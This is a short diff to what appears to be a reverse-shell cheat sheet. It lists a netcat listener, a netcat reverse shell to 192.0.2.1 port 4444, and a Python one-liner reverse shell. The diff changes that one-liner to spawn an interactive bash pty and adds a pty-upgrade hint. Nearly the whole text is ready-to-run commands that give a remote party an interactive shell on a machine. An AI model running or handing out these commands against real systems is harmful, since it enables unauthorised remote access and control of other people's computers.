@@ -4,8 +4,8 @@ nc -lvp 4444
 # Netcat reverse shell
 nc -c sh 192.0.2.1 4444
 
-# Python reverse shell
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.0.2.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+# Python reverse shell, spawns interactive pty
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.0.2.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 
 # Possibilities to upgrade to an interactive pty
 script /dev/null
